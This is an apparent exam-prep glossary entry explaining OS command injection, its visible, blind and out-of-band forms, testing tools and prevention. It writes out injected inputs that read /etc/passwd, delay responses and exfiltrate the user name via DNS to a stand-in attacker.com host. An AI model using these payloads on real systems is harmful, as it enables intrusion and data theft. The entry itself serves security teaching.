Command Injection

Command Injection (also called OS Command Injection or Shell Injection) is a vulnerability that allows an attacker to execute arbitrary operating system commands on the underlying server by injecting malicious input into application parameters that are passed to system call functions (system(), exec(), popen() in C; Runtime.exec() in Java; os.system() in Python).

Types & Variations

  • Explicit/Visible Command Injection — Attack output is reflected in the HTTP response; attacker can see command results directly (e.g., directory listing)
  • Blind Command Injection — No visible output; attacker infers results through time delays, DNS callbacks, or boolean-based responses
  • Out-of-Band (OOB) Command Injection — Exfiltrates data via DNS lookups or HTTP requests to external server: ping -c 1 $(whoami).attacker.com
  • Multi-line Injection — Uses newline characters (%0a) to terminate the intended command and execute additional commands

Common Tools & Techniques

Commix (automated command injection tool) Burp Suite Repeater (manual testing) Nmap for verification of blind injections

Ethical hackers and security professionals use these tools in authorized penetration tests and red team operations. Unauthorized use is illegal under the Computer Fraud and Abuse Act (CFAA) and equivalent legislation worldwide.

Real-World Examples

Visible: Parameter "host" passed to ping command — input: 127.0.0.1; cat /etc/passwd — response contains file contents
Blind: Input: 127.0.0.1 && sleep 5 — if response takes 5+ seconds, injection is confirmed
OOB: Input: 127.0.0.1; nslookup $(whoami).attacker.com — attacker's DNS server logs the query revealing "www-data"

How Command Injection Appears on the CEH v13 Exam

Command injection is covered in CEH v13 Module 14 (Hacking Web Applications) alongside SQL injection and XSS as a key injection vulnerability. The exam tests knowledge of shell metacharacters and their functions (;, |, &&, ||, $(), backticks), how to identify vulnerable endpoints (parameters passed to system calls), blind/OOB injection techniques, prevention strategies (input validation with allowlists, avoiding shell interpretation via parameter arrays, output encoding, containerization/sandboxing), and differences from SQL injection (OS-level vs database-level). Questions may present code snippets for vulnerability identification.

Prevention & Detection

  • Input Validation: Implement strict allowlist-based input validation on all user-facing parameters
  • Principle of Least Privilege: Run applications with minimum required permissions
  • Regular Patching: Maintain timely vulnerability management and patch deployment
  • Network Segmentation: Limit lateral movement through zone-based network architecture
  • Monitoring & Alerting: Deploy SIEM/SOAR solutions with threat detection rules for anomalous activity
